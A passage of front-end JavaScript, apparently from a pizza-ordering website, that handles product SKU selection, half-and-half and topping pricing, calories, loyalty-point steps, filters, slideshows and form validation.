        if (selected_option.is(':disabled')) {
          options.prop('selected', false)
          options.filter(':enabled:first').prop('selected', true)
        }

        NiceSelect.updateFromSelect(sku_part)
      })
    } else if (!useGlobalSkus(form)) {
      sorted_sku_parts.each(function (sku_part_index, sku_part) {
        var inputs = $j(sku_part).find('input')

        inputs.each(function (input_index, input) {
          var sub = sorted_sku_parts.slice(0, sku_part_index).map(function (i, e) {
                return $j(e).find('input:checked').val()
              }).get().concat([input.value]).join('$'),
              is_available = false

          for (var sku in basePricing[product_handle]['sku_handles']) {
            if (sku.indexOf(sub) >= 0) {
              is_available = true
            }
          }
          $j(input).prop('disabled', !is_available)
        })

        var selected_input = inputs.filter(':checked')
        if (selected_input.is(':disabled')) {
          inputs.prop('checked', false)
          inputs.filter(':enabled:first').prop('checked', true)
        }
      })
    }

    // Update data-sku
    var sku_handle = skuHandle(form)
    form.attr('data-sku', sku_handle)
  }

  var multisidePriceInclToppings = function (form, product_handle, sku_handle) {
    var sides = []

    form.find('[data-side] option:selected').each(function (i, e) {
      var option = $j(e),
          html_id = option.attr('data-option'),
          sku_options = optionPricing[product_handle][sku_handle],
          side_price = (sku_options['sides'] || {})[html_id]
      if (side_price) {
        sides.push(side_price)
      }
    })
    if (sides.length == 0) return undefined

    // Toppings
    var side_toppings = {} // topping_name -> [price_side_1, price_side_2, ...]
    form.find('[data-side] [data-option] input:checked, input[data-option]:checked').each(function (i, e) {
      var input = $j(e),
          side_nb = input.closest('[data-side]').attr('data-side'),
          topping_name = input.val(),
          data_option = input.closest('[data-option]'),
          html_id = data_option.attr('data-option'),
          sku_options = optionPricing[product_handle][sku_handle],
          topping_price = (sku_options['side_toppings'] || {})[html_id]
      if (!side_toppings[topping_name]) side_toppings[topping_name] = []
      side_toppings[topping_name][side_nb - 1] = topping_price
    })

    var price = 0

    if (multiside_side_pricing == 'average') {
      $j.each(sides, function () {
        price += this
      })
      price = Math.floor(price / sides.length)

      return price + multisideToppingsPrice(side_toppings, sides.length, null)

    } else if (multiside_side_pricing == 'most_expensive') {
      $j.each(sides, function () {
        price = Math.max(price, this)
      })
      return price + half_half_surcharge() + multisideToppingsPrice(side_toppings, sides.length, null)

    } else if (multiside_side_pricing == 'most_expensive_with_surcharge') {
      // TODO: remove this as soon as we can reload Touch and therefore remove this multiside pricing case
      $j.each(sides, function () {
        price = Math.max(price, this)
      })
      // multiside_side_pricing_surcharge needs to be transformed into cents
      return price + half_half_surcharge() + multisideToppingsPrice(side_toppings, sides.length, null)
    } else if (multiside_side_pricing == 'most_expensive_incl_toppings') {
      $j.each(sides, function (i, side_price) {
        var side_nb = i + 1,
            price_incl_toppings = side_price + multisideToppingsPrice(side_toppings, sides.length, side_nb)
        price = Math.max(price_incl_toppings, price)
      })
      return price
    }
  }

  var half_half_surcharge = function() {
    if (multiside_side_pricing_surcharge !== null) {
      return (multiside_side_pricing_surcharge * 100)
    } else {
      return 0
    }
  }

  var multisideToppingsPrice = function (side_toppings, nb_sides, side_nb) {
    // side_toppings: topping_name -> [price_side_1, price_side_2, ...]
    var toppings_price = 0

    if (side_nb) {
      $j.each(side_toppings, function (topping_name, prices) {
        var topping_price = prices[side_nb - 1]
        if (topping_price) toppings_price += topping_price
      })

    } else if (multiside_topping_pricing == 'once') {
      $j.each(side_toppings, function (topping_name, prices) {
        var max_topping_price = 0
        $j.each(prices, function (i, topping_price) {
          if (topping_price) max_topping_price = Math.max(max_topping_price, topping_price)
        })
        toppings_price += max_topping_price
      })

    } else if (multiside_topping_pricing == 'split') {
      $j.each(side_toppings, function (topping_name, prices) {
        $j.each(prices, function (i, topping_price) {
          if (topping_price) toppings_price += Math.floor(topping_price / nb_sides)
        })
      })

    } else if (multiside_topping_pricing == 'full') {
      $j.each(side_toppings, function (topping_name, prices) {
        $j.each(prices, function (i, topping_price) {
          if (topping_price) toppings_price += topping_price
        })
      })
    }

    return toppings_price
  }

  var updatePrice = function (form) {
    var product_handle = form.attr('data-product'),
        sku_handle = form.attr('data-sku'),
        price = basePricing[product_handle]['skus'][sku_handle],
        multiside_price = multisidePriceInclToppings(form, product_handle, sku_handle),
        nb_free_toppings = basePricing[product_handle]['nb_free_toppings'] || 0

    if (multiside_price) price += multiside_price

    // Mark the price element as empty if needed
    form.find('[data-product-price]').attr('data-product-price-empty', price ? null : '')
    form.find('.product__price.from').attr('data-product-price-empty', price ? null : '') // currently only used for touch/themes/pizzan/widgets/product_price.rhtml:10

    // Calculate the price and insert it in the [data-product-price] element
    if (price) {
      var toppings = [],
          ingredients = []

      form.find('[data-option] input, input[data-option]').each(function (i, e) {
        var input = $j(e),
            is_checked = input.is(':checked'),
            data_option = input.closest('[data-option]'),
            html_id = data_option.attr('data-option'),
            quantity = input.attr('data-quantity') || 1,
            force_ingredient = data_option.is('[data-option-ingredient]'),
            sku_options = optionPricing[product_handle][sku_handle],
            topping_price = (sku_options['toppings'] || {})[html_id],
            ingredient_value = (sku_options['ingredients'] || {})[html_id],
            option_price = (sku_options['options'] || {})[html_id],
            enum_price = (sku_options['enums'] || {})[html_id]
        if (topping_price && is_checked) {
          if (force_ingredient) quantity--
          for (var i = 0; i < quantity; ++i) toppings.push(topping_price)
        } else if (ingredient_value && !is_checked) {
          ingredients.push(ingredient_value)
        } else if ((option_price || enum_price) && is_checked) {
          price += (option_price || enum_price) * quantity
        }
      })

      toppings.sort(function (a, b) {
        return a - b
      })

      ingredients.sort(function (a, b) {
        return a - b
      })

      if (swap_toppings == '1_by_1') {
        $j.each(toppings.slice().reverse(), function (i, topping_value) {
          var topping_index = toppings.findIndex(function (_topping_value) {
            return topping_value == _topping_value
          })
          var ingredient_index = ingredients.findIndex(function (ingredient_value) {
            return ingredient_value >= topping_value
          })
          if (ingredient_index >= 0) {
            toppings.splice(topping_index, 1)
            ingredients.splice(ingredient_index, 1)
          }
        })
      }

      // hide price and show '(Free)' for free toppings
      let toppings_row = document.getElementsByClassName('popup-row popup-row_set popup-row_toppings')[0]
      if (toppings.length >= nb_free_toppings)
        toppings_row?.classList.add("show-toppings-price")
      else
        toppings_row?.classList.remove("show-toppings-price")

      let toppings_selected = toppings_row?.querySelectorAll('input:checked')
      let toppings_unselected = toppings_row?.querySelectorAll('input:not(:checked)')
      if (toppings_selected && toppings_selected.length <= nb_free_toppings) {
        toppings_unselected?.forEach(el => el.parentElement.classList.remove('free_topping'))
        toppings_selected?.forEach(el => el.parentElement.classList.add('free_topping'))
      }

      toppings = toppings.slice(nb_free_toppings)
      var toppings_price = 0
      $j.each(toppings, function () {
        toppings_price += this
      })

      if (swap_toppings == 'charge_difference') {
        $j.each(ingredients, function () {
          toppings_price = Math.max(0, toppings_price - this)
        })
      }
      price += toppings_price

      // Display the price
      form.find('[data-product-price]').html(moneyToString(price))
    }
  }

  var updateOptions = function (form) {
    var product_handle = form.attr('data-product'),
        sku_handle = form.attr('data-sku')

    if (!optionPricing[product_handle]) return

    $j.each(['enums', 'toppings', 'side_toppings', 'ingredients', 'options'], function (i, set_type) {
      $j.each(optionPricing[product_handle][sku_handle][set_type], function (html_id, price) {
        var option = form.find('[data-option=' + html_id + ']'),
            input = option.find('input').addBack('input')

        // Set the price
        if (set_type == 'side_toppings' && multiside_topping_pricing == 'split' && price !== null) price = Math.floor(price / 2)
        option.find('[data-option-price]').html(moneyToString(price))

        // If the option is not available, mark it and disable the input
        option.attr('data-option-disabled', price === null ? '' : null)
        input.prop('disabled', price === null)
      })

      if (optionCalories[product_handle]) {
        $j.each(optionCalories[product_handle][sku_handle][set_type], function (html_id, nb_calories) {
          var option = form.find('[data-option=' + html_id + ']');

          // Set the calories
          option.find('[data-option-calories]').html(nb_calories ? nb_calories + ' kcal' : '')
        })
      }
    })

    // If a selected option is disabled, select the first available option
    form.find('input:disabled:checked').each(function (i, e) {
      var input = $j(e),
          name = input.attr('name')
      input.prop('checked', false)
      form.find('input[name="' + name + '"]:enabled:first').prop('checked', true)
    })
  }

  var updateCalories = function (form) {
    var product_handle = form.attr('data-product'),
        sku_handle = form.attr('data-sku'),
        nb_calories = null;

    if (calories[product_handle]) {
      nb_calories = calories[product_handle]['skus'][sku_handle]
    }
    form.find('[data-product-calories]').html(nb_calories ? nb_calories + ' kcal' : '')
  }

  var updateForm = function (form) {
    updateSkus(form)
    updatePrice(form)
    updateOptions(form)
    updateCalories(form)
  }

  var updateNonGlobalForms = function () {
    $j('form[data-product]').each(function () {
      var form = $j(this)
      if (!useGlobalSkus(form)) updateForm(form)
    })
  }

  var updateGlobalForms = function () {
    // Find the sku keys having at least one available product
    var available_sku_keys = {}
    $j('[data-category] form[data-product]').each(function () {
      var form = $j(this)

      if (useGlobalSkus(form)) {
        var product_handle = form.attr('data-product')
        for (var sku_key in basePricing[product_handle]['sku_handles']) {
          available_sku_keys[sku_key] = true
        }
      }
    })

    // Disable sku part when no product is available
    var sorted_sku_parts = sortedGlobalSkuParts()
    sorted_sku_parts.each(function (sku_part_index, sku_part) {
      var inputs = $j(sku_part).find('input')

      inputs.each(function (input_index, input) {
        var partial_sku_key = sorted_sku_parts.slice(0, sku_part_index).map(function (i, e) {
              return $j(e).find('input:checked').val()
            }).get().concat([input.value]).join('$'),
            is_available = false

        for (var sku in available_sku_keys) {
          if (sku.indexOf(partial_sku_key) >= 0) {
            is_available = true
          }
        }
        $j(input).prop('disabled', !is_available)
      })

      var selected_input = inputs.filter(':checked')
      if (selected_input.is(':disabled')) {
        inputs.prop('checked', false)
        inputs.filter(':enabled:first').prop('checked', true)
      }

      // update the value of the data-grouped-selected-sku-name if a sku name is available
      var selected_sku_name = selected_input.closest('[data-grouped-sku]')
          .find('[data-grouped-sku-name]')
          .html()
      if (selected_sku_name) {
        $j(sku_part).find('[data-grouped-selected-sku-name]').html(selected_sku_name)
      }
    })

    // Update product prices and hide unavailable products
    $j('[data-category] form[data-product]').each(function () {
      var form = $j(this)

      if (useGlobalSkus(form)) {
        var sku_handle = skuHandle(form)
        if (sku_handle) {
          form.attr('data-sku', sku_handle)
          updatePrice(form)
        }
        // TODO: remove the explicit class
        form.closest('.product').toggle(sku_handle != undefined)
      }
    })
  }

  var setupHandlers = function () {
    // Sku handlers
    $j('[data-sku-part]').each(function () {
      var data_sku_part = $j(this),
          form = data_sku_part.closest('form')
      data_sku_part.find('select, input[type=radio]').addBack('select').change(function () {
        updateForm(form)
      })
    })

    // Global sku handlers
    $j('[data-grouped-sku-part]').each(function () {
      var data_grouped_sku_part = $j(this)
      data_grouped_sku_part.find('select, input[type=radio]').addBack('select').change(function () {
        updateGlobalForms()
      })
    })

    // Option handlers
    $j('[data-option]').find('input').addBack('input').each(function () {
      var option = $j(this),
          form = option.closest('form')
      option.change(function () {
        updatePrice(form)
      })
    })

    // Side dropdown handlers
    $j('[data-side] select, select[data-side]').each(function () {
      var data_side = $j(this),
          form = data_side.closest('form')
      data_side.change(function () {
        updatePrice(form)
      })
    })
  }

  return {
    init: function (options) {
      currency                              = options['currency']
      locale                                = options['locale']
      swap_toppings                         = options['swap_toppings']
      multiside_side_pricing                = options['multiside_side_pricing']
      multiside_side_pricing_surcharge      = options['multiside_side_pricing_surcharge']
      multiside_topping_pricing             = options['multiside_topping_pricing']
      setupHandlers()
      updateNonGlobalForms()
      if ($j('[data-grouped-sku-part]').length > 0) updateGlobalForms()
    },

    setBasePricing: function (product_handle, base_pricing) {
      basePricing[product_handle] = base_pricing
    },

    setOptionsPricing: function (product_handle, option_pricing) {
      optionPricing[product_handle] = option_pricing
    },

    setCalories: function (product_handle, _calories) {
      calories[product_handle] = _calories
    },

    setOptionsCalories: function (product_handle, option_calories) {
      optionCalories[product_handle] = option_calories
    },

    decQuantity: function (field) {
      updateQuantity(field, '-')
    },

    incQuantity: function (field) {
      updateQuantity(field, '+')
    },

    updatePrice: function (_form) {
      checkInit()
      var form = $j(_form)
      updatePrice(form)
    },

    updateForm: function (_form) {
      checkInit()
      var form = $j(_form)
      updateForm(form)
    },

    maxNumberOfToppings: function (groups, max_nb_toppings, max_nb_toppings_message) {
      max_nb_toppings = parseInt(max_nb_toppings)

      var nb_changes_exceeded = function (group) {
        return $j(group).find('[data-option-not-base-ingredient]:checked').length > max_nb_toppings;
      }

      var show = function () {
        var message = $j('#message-info-centred')
        Flash.displayFreeMessage(message, max_nb_toppings_message, 5000)
      }

      if (Number.isInteger(max_nb_toppings)) {
        $j(groups).on('click', '[data-option-not-base-ingredient]', function () {
          var clicked_input = $j(this)
          $j(groups).each(function (i, group) {
            if (nb_changes_exceeded(group)) {
              clicked_input.prop('checked', false)
              show()
            }
          })
        })
      }
    },

    maxIngredientsRemovedWarning: function (groups, max_ingredients_removal, max_ingredients_removal_message) {
      max_ingredients_removal = parseInt(max_ingredients_removal)

      var nb_max_ingredients_removed_exceeded = function (groups, nb_base_ingredients) {
        return $j(groups).find('[data-option-base-ingredient]:checked').length < nb_base_ingredients - max_ingredients_removal
      }

      var show = function () {
        var message = $j('#message-info-centred')
        Flash.displayFreeMessage(message, max_ingredients_removal_message, 5000)
      }

      if (Number.isInteger(max_ingredients_removal)) {
        var nb_base_ingredients = $j(groups).find('[data-option-base-ingredient]:checked').length

        $j(groups).on('click', '[data-option-base-ingredient]', function () {
          var clicked_input = $j(this)
          if (nb_max_ingredients_removed_exceeded(groups, nb_base_ingredients)) {
            clicked_input.prop("checked", true)
            show()
          }
        })
      }
    }
  }
})()
/***************************************************************
 Product Counter
 **************************************************************/

var ProductCounter = (function () {
  function init (basket) {
    var productCounters = {}, // product_handle -> quantity
        dealCounters = {} // deal_id -> quantity

    basket.basket_items.forEach(function (basketItem) {
      productCounters[basketItem.product_handle] = (productCounters[basketItem.product_handle] || 0) + basketItem.quantity
    })

    basket.deal_bags.forEach(function (dealBag) {
      dealCounters[dealBag.deal_id] = (dealCounters[dealBag.deal_id] || 0) + 1

      dealBag.items.forEach(function (dealBasketItem) {
        productCounters[dealBasketItem.product_handle] = (productCounters[dealBasketItem.product_handle] || 0) + 1
      })
    })

    $j('[data-basket-counter]').each(function () {
      var form = $j(this).closest('form')

      var productHandle = form.attr('data-product'),
          dealId = form.attr('data-deal'),
          quantity

      if (dealId) {
        quantity = dealCounters[dealId]
      } else {
        quantity = productCounters[productHandle]
      }

      $j(this).html(quantity || '')
      form.closest('.product').toggleClass('product_with-counter', !!quantity)
    })
  }

  return {
    init: init
  }
}())
/*****************************************
 Product filter
 - mobile dropdown filter support
 ****************************************/

var ProductFilter = (function () {
    var summary;
    // dropdown filter selected item sinchronisation
    var mobileDropdown;
    var mobileDropdownIndicator = ".product-filter__mobile [data-filter-tag]";

    var setEvents = function () {
        $j('[data-filter-tag]').on('click', setName);

        $j('[data-filter-tag]').each(function () {
            var tag = $j(this).attr('data-filter-tag'),
                query = 'product_tags';
            if (tag && tag.startsWith('!')) {
                tag = tag.split('!')[1];
                query = 'product_tags_not';
            }

            $j(this).find('input').on('click', function (e) {
                var dom_url = new DomUrl();
                dom_url.query['product_tags'] = null;
                dom_url.query['product_tags_not'] = null;
                dom_url.query[query] = tag || null;
                dom_url.hash = '';
                Util.redirect(dom_url.toString());
            });
        });

        $j('.product-filter__selected').on('click', function (e) {
            e.preventDefault();
            $j(this).toggleClass('product-filter__selected_open');
        });
    };

    var selectFilter = function () {
        var dom_url = new DomUrl(),
            tag = dom_url.query['product_tags'] || '',
            tag_not = dom_url.query['product_tags_not'] || '';

        $j('[data-filter-tag="' + tag + '"] input').prop('checked', true);
        $j('[data-filter-tag="!' + tag_not + '"] input').prop('checked', true);
        // dropdown filter selected item sinchronisation
        if(mobileDropdown) {
          $j('[data-filter-tag="' + tag + '"]').attr('data-filter-selected', true);
        }
    };

    var setName = function () {
        var selected_name = $j('[data-filter-tag] input').filter(':checked').siblings('[data-filter-tag-name]').html();
        $j('[data-filter-selected-name]').html(selected_name);
    };

    var setSummary = function () {
        var dom_url = new DomUrl(),
            selected_tag = dom_url.query['product_tags'] || dom_url.query['product_tags_not'];

        if (!selected_tag) {
            $j('[data-filter-summary]').hide();
        }
        else {
            if (dom_url.query['product_tags_not']) selected_tag = "!" + selected_tag;
            $j('[data-filter-summary]').show();
            $j.each(summary, function (tag, str) {
                if (tag == selected_tag) {
                    $j('[data-filter-summary-criteria]').html(str);
                    $j('[data-filter-summary]').show();
                }
            });
        }

    };

    var cancelFilter = function () {
        Util.redirect(window.location.href.replace(/\?.*/, ''));
    };

    return {
        init: function (_summary) {
            summary = _summary;
            // dropdown filter selected item sinchronisation
            mobileDropdown = $j(mobileDropdownIndicator).length > 0 ? true : false;

            setEvents();
            selectFilter();
            setName();
            setSummary();
        },

        cancelFilter: cancelFilter
    };
}());
/*****************************
 Referral
 *****************************/

var Referral = (function () {

  function init () {}

  var ajaxPost = function (url, page) {
    $j.ajax({
      url: url,
      type: 'post',
      data: 'page=' + encodeURIComponent(page)
    }).done(function (data) {
      $j('#basket-holder').html(data)
      window.location.href = '/menu'
    })
  }

  function startOrder(_this) {
    ajaxPost('/coupon_code?code='+ encodeURIComponent($j(_this).data('referral_coupon')) + '&page=step_basket', 'step_basket')
  }

  return {
    init: init,
    startOrder: startOrder
  }
}())/*****************************
 Responsive Slideshow
 *****************************/

var ResponsiveSlideshow = (function () {
  var mobile_breakpoint,
      desktop_slider,
      desktop_container,
      mobile_slider,
      mobile_container,
      unslider_options,
      desktop_active = false,
      mobile_active = false

  function setActiveSlider () {
    var is_mobile = mobile_breakpoint && $j(window).width() <= mobile_breakpoint
    if (is_mobile && !mobile_active) {
      desktop_slider.unslider('stop')
      desktop_container.hide()
      desktop_active = false

      mobile_slider.unslider('start')
      mobile_container.show()
      mobile_active = true

    } else if (!is_mobile && !desktop_active) {
      desktop_slider.unslider('start')
      desktop_container.show()
      desktop_active = true

      mobile_slider.unslider('stop')
      mobile_container.hide()
      mobile_active = false
    }
  }

  function init (_mobile_breakpoint, _desktop_slider, _mobile_slider, _unslider_options) {
    mobile_breakpoint = _mobile_breakpoint
    desktop_slider = _desktop_slider
    mobile_slider = _mobile_slider
    unslider_options = _unslider_options

    desktop_container = desktop_slider.closest('[data-responsive-slideshow-container]')
    mobile_container = mobile_slider.closest('[data-responsive-slideshow-container]')
    if (desktop_container.length == 0 || mobile_container.length == 0) {
      console.error('Desktop and mobile sliders must be contained in a div with a data-responsive-slideshow-container attribute')
    }

    if (desktop_slider.find('li').length <= 1) {
      desktop_slider.unslider = function () {}
    }
    if (mobile_slider.find('li').length <= 1) {
      mobile_slider.unslider = function () {}
    }

    desktop_slider.unslider(unslider_options)
    mobile_slider.unslider(unslider_options)

    $j(window).on('resize', setActiveSlider)
    setActiveSlider()
  }

  return {
    init: init
  }
}())
/*****************************
 SkuButtons
 *****************************/

var SkuButtons = (function () {
  var is_mobile

  function isMobile () {
    return ($j('.header__burger-menu').filter(':hidden').length == 0)
  }

  function setButtonSkuTexts () {
    $j('[data-mobile-sku-part]').each(function () {
      var sku_part_index = $j(this).attr('data-mobile-sku-part'),
          form = $j(this).closest('.product__form'),
          sku_part = form.find('[data-sku-part="' + sku_part_index + '"]'),
          radio = sku_part.find('input:checked'),
          sku_part_value_name = radio.closest('.sku-buttons__item-label').find('.sku-buttons__text').html()
      $j(this).html(sku_part_value_name)
    })
  }

  function mobileButtonSkuClicked (e) {
    var radio = $j(e.target),
        form = radio.closest('.product__form'),
        sku_part_index = radio.closest('ul').attr('data-sku-part'),
        sku_part_value = radio.val(),
        desktop_radio = form.find('[data-sku-part=' + sku_part_index + '] input[value=' + sku_part_value + ']'),
        sku_part_value_name = desktop_radio.closest('label').find('.sku-buttons__text').html(),
        toggle_span = form.find('[data-mobile-sku-part="' + sku_part_index + '"]')

    toggle_span.html(sku_part_value_name)
    desktop_radio.click()
  }

  function summaryClicked (e) {
    e.preventDefault()

    var summary = $j(e.target).closest('.sku-buttons-summary'),
        form = summary.closest('.product__form'),
        skus_desktop = form.find('.sku-buttons'),
        skus_mobile = form.find('.product__mobile-sku-buttons')

    if (!summary.hasClass('cloned')) {
      var clone = skus_desktop.clone(true).removeClass('sku-buttons')
      // Change the radio group name so that it is not the same as desktop
      clone.find('input').each(function () {
        var input = $j(this)
        input.attr('name', 'mobile_' + input.attr('name'))
      })
      clone.appendTo(skus_mobile)
      skus_mobile.find('.sku-buttons__part input').on('click', mobileButtonSkuClicked)

      summary.addClass('cloned synchronised')
    }

    if (summary.hasClass('cloned') && !summary.hasClass('synchronised')) {
      // Sync desktop -> mobile
      if (!skus_mobile.is(':visible')) {
        $j(skus_desktop).find('[data-sku-part]').each(function () {
          var sku_part_index = $j(this).attr('data-sku-part'),
              sku_part_value = $j(this).find('input:checked').val()
          skus_mobile.find('[data-sku-part="' + sku_part_index + '"] input[value="' + sku_part_value + '"]').click()
        })
      }
      summary.addClass('synchronised')
    }

    skus_mobile.show()
  }

  function resize () {
    if (is_mobile != isMobile()) {
      // Hide summaries when resizing to desktop
      if (is_mobile) {
        $j('.product__mobile-sku-buttons').hide()
        $j('.sku-buttons-summary.synchronised').removeClass('synchronised')
      }
      // Init summaries when resizing to mobile
      if (!is_mobile) {
        setButtonSkuTexts()
      }
      is_mobile = isMobile()
    }
  }

  function init () {
    if ($j('[data-mobile-sku-part]').size() == 0) return

    is_mobile = isMobile()
    setButtonSkuTexts()
    $j('.sku-buttons-summary').on('click', summaryClicked)
    $j(window).on('resize', resize)
  }

  return {
    init: init
  }
})()
/***************************************************************
 Step 4 loyalty radio
 To be used when products are shown as radio buttons (not select)
 **************************************************************/

var Step4LoyaltyRadio = (function () {
  function init () {
    $j('#step4_submit').click(function (event) {
      var option = $j('input[data-default-product].selected')
      if (option.val()) {
        var form = $j('<form data-product="' + option.attr('data-default-product') + '" data-sku="' + option.attr('data-default-sku') + '"></form>')
        $j('body').append(form.hide())
        Basket.synchronousCreateItemInStepBasket(form)
      }
    })

    $j('input[name=loyalty_points]').click(function () {
      var input = $j(this)
      if (input.hasClass('selected')) {
        input.removeClass('selected').prop('checked', false)
      } else {
        $j('input[name=loyalty_points]').removeClass('selected')
        input.addClass('selected').prop('checked', true)
      }
    })
  }

  return {
    init: init
  }
}())
/***************************************************************
 Step 4 loyalty select/radio
 To be used when basket items are shown as radio and products as select
 **************************************************************/

var Step4LoyaltySelectRadio = (function () {
  var init = function () {
    var _productLoyaltyGroup = function () {
      var productLoyaltyGroup = $j('select[name=product_loyalty_group]').val()
      if (productLoyaltyGroup) {
        var items = productLoyaltyGroup.split('---')
        return { points: items[0], productHandle: items[1], skuHandle: items[2] }
      }
    }

    $j('#step4_submit').click(function (event) {
      var productLoyaltyGroup = _productLoyaltyGroup()
      if (productLoyaltyGroup) {
        var form = $j('<form data-product="' + productLoyaltyGroup['productHandle'] + '" data-sku="' + productLoyaltyGroup['skuHandle'] + '"></form>')
        $j('body').append(form.hide())
        Basket.synchronousCreateItemInStepBasket(form)
      }
    })

    // ---------------------
    // Basket loyalty group clicked
    // ---------------------
    $j('input[name=basket_loyalty_group]').click(function () {
      var input = $j(this)

      if (input.hasClass('selected')) {
        input.removeClass('selected').prop('checked', false)
      } else {
        $j('input[name=basket_loyalty_group]').removeClass('selected')
        input.addClass('selected').prop('checked', true)
      }

      // Unselect product loyalty group
      $j('select[name=product_loyalty_group] option:selected').prop('selected', false)
      NiceSelect.updateFromSelect($j('select[name=product_loyalty_group]'))

      // Set loyalty_points hidden field
      var points = $j('input[name=basket_loyalty_group]:checked').val()
      $j('input[name=loyalty_points]').val(points)
    })

    // ---------------------
    // Product loyalty group clicked
    // ---------------------
    $j('select[name=product_loyalty_group]').change(function () {
      var select = $j(this)
      if (select.val()) {
        // Unselect basket item
        $j('input[name=basket_loyalty_group]').removeClass('selected').prop('checked', false)
      }

      // Set loyalty_points hidden field
      $j('input[name=loyalty_points]').val(_productLoyaltyGroup()['points'])
    })
  }

  return {
    init: init
  }
}())
/*****************************
 TermsAcceptance

 For use on step5.
 When the confirm button is clicked, check that all checkboxes within [data-terms-acceptance] or display an alert if error_message is defined.
 *****************************/

var TermsAcceptance = (function () {
  var error_message,
      error_class

  var init = function (_error_message, _error_class) {
    window.onload = function() {
      error_message = _error_message
      error_class = _error_class
      submitClicked()
      disablePayButton(true)
    }

    $j(function () {
      $j('form[name=step5_form] [type=submit]').click(submitClicked)
    })
  }

  var checkboxClicked = function () {
    var is_error = $j('[data-terms-acceptance] input:not(:checked)').length > 0
    $j('[data-terms-acceptance]').toggleClass(error_class, is_error)
  }

  var submitClicked = function () {
    if ($j('[data-terms-acceptance] input:not(:checked)').length == 0) {
      disablePayButton(false)
      return true
    } else {
      $j('[data-terms-acceptance] [type=checkbox]').click(checkboxClicked)
      checkboxClicked()
      disablePayButton(true)
      if (error_message) {
        alert(error_message)
      }
      return false
    }
  }

  function disablePayButton (disabled) {
    if (document.getElementsByClassName('form-buttons__button').length) {
      var buttonPay = document.getElementsByClassName('form-buttons__button')[0]
      buttonPay.disabled = disabled
      buttonPay.style.opacity = disabled ? 0.5 : 1
    }
  }

  return {
    init: init,
    submitClicked: submitClicked
  }
}())
/*****************************
 Util
 *****************************/

var Util = (function () {
  return {
    addKeyValueToURL: function (url, key, value) {
      var dom_url = new DomUrl(url)
      dom_url.query[key] = value
      return dom_url.toString()
    },

    addParametersToURL: function (url, parameters) {
      var dom_url = new DomUrl(url)
      $j.each(parameters.split('&'), function () {
        var key_value = this.split('='),
            key = key_value[0],
            value = key_value[1]
        dom_url.query[key] = value
      })
      return dom_url.toString()
    },

    currentPage: function () {
      var path = new DomUrl(window.location.href).path
      return path.replace(/^\//, '')
    },

    getParameterFromUrl: function (url, key) {
      var dom_url = new DomUrl(url)
      return dom_url.query[key]
    },

    getHashParameterFromUrl: function (url, key) {
      return url.substring(url.indexOf('#'+key+'=')+(key.length + 2), url.indexOf('&'))
    },

    redirect: function (url) {
      window.location.href = url
    },

    removeKeyFromUrl: function (url, key) {
      var dom_url = new DomUrl(url)
      delete dom_url.query[key]
      return dom_url.toString()
    },

    showMore: function (show_more, lines, nb_lines) {
      lines.show()
      if (lines.length > nb_lines) {
        lines.slice(nb_lines).hide()
        show_more.show()
      }
      else {
        show_more.hide()
      }

      show_more.click(function () {
        show_more.hide()
        lines.show()
      })
    },

    // Replace each occurrence like #{KEY} in haystack by the value given by hash_needles[KEY]
    replaceStringWithHash: function (haystack, hash_needles) {
      copy = String(haystack)
      for (var k in hash_needles)
        copy = copy.replace('#{' + k + '}', hash_needles[k])
      return copy
    },

    copyToClipboard: function (text_to_copy, copied_el) {
      var el = document.createElement('textarea')
      var message = text_to_copy
      el.value = message.replace(/\\'/g, "'").replace(/\\"/g, '"')
      document.body.appendChild(el)
      el.select()
      document.execCommand('copy')
      document.body.removeChild(el)

      $j(copied_el).show()
      setTimeout(function() { $j(copied_el).hide() }, 1000)
      return false
    }
  }
}())
/************************************************************************************
  Validate Fields: Extended version 
  Checks for non empty required fields [data-form-required]
  Adds extra fields validation with regular expression via addValidation() call
  -----------------------------------------------------------------------------------
  For example:
  ValidateFields.addValidation(
    [
      {
        selector: "[name='postal_code']",
        regexp: "^(97432|97410)$",
        message: "Code Postal must be 97432 or 97410"
      },
      {
        selector: "[name='city']",
        regexp: "\\S+",
        message: "City cannot be empty"
      }
    ]
  )
*************************************************************************************/

var ValidateFields = (function () {
  var form
  var check_list
  var extra_validation = false

  var parent_selector      = ".checkout-row"
  var parent_warning_class = "checkout-row_not-valid"
  var warning_class        = "checkout-row__warning"
  var message_html         = '<div class="checkout-row__group-item checkout-row__group-item_warning"><span class="checkout-row__warning-message">$message</span></div>'

  function warningOn(elem) {
    elem.addClass(warning_class)
    elem.parents(parent_selector).addClass(parent_warning_class)
  }

  function warningOff(elem) {
    elem.removeClass(warning_class)
    elem.parents(parent_selector).removeClass(parent_warning_class)
  }

  var addValidation = function (_check_list) {

    if (_check_list.length == 0) return

    var elem
    var message
    check_list       = _check_list
    extra_validation = true

    for (var i = 0; i < check_list.length; i++) {
      elem    = $j(check_list[i].selector)
      message = message_html.replace('$message',check_list[i].message)
      elem.after(message)
    }
  }

  var validateExtra = function () {
    var valid = true
    var reg
    var elem
    var val

    for (var i = 0; i < check_list.length; i++) {

      if (check_list[i].regexp.length == 0) continue

      reg  = new RegExp(check_list[i].regexp)
      elem = $j(check_list[i].selector)
      val  = elem[0].value.trim()
      warningOff(elem)

      if (val.match(reg)) continue

      warningOn(elem)
      valid = false
    }

    return valid
  }


  var onSuccess = function (_form, callback) {
    form = $j(_form)
    if (validate()) callback()
  }


  var validate = function () {
    var valid = true
    var valid_extra = true

    form.find('[data-form-required]').removeClass(warning_class).each(function () {
      var input = $j(this)
      if (!input.val()) {
        input.addClass(warning_class)
        valid = false
      }
    })

    if (extra_validation) {
      valid_extra = validateExtra()
    }

    return (valid && valid_extra)
  }

  return {
    onSuccess: onSuccess,
    addValidation: addValidation
  }
})()
/*************************
 Scroll page top button
 *************************/

function scroll_page_top () {
  var btn = $j('.scroll-up')
  var shown = false

  function scroll_level () {
    return ($j(window).scrollTop() > 200)
  }

  function show_btn () {
    if (shown) return
    btn.addClass('scroll-up_show')
    shown = true
  }

  function hide_btn () {
    if (!shown) return
    btn.removeClass('scroll-up_show')
    shown = false
  }

  function set_btn () {
    if (scroll_level()) {
      show_btn()
      return
    }
    hide_btn()
  }

  function init () {
    $j('.scroll-up').on('click', function (e) {
      e.preventDefault()
      $j(window).scrollTo(0, 100)
    })
    $j(window).on('scroll', set_btn)
  }

  return { init: init }
}

$j(document).ready(function () {
  var st = scroll_page_top()
  st.init()
})

/****************************************************
 Stick Footer to the screen bottom for short pages
 ****************************************************/

function footer_fix () {
  var page = $j('.page'),
      footer = $j('.page__footer'),
      content = $j('.page__content'),
      hSet = false,
      wH, err, fH, cTop, newH

  function set_height () {
    if (hSet) {
      content.css('min-height', '')
      hSet = false
    }
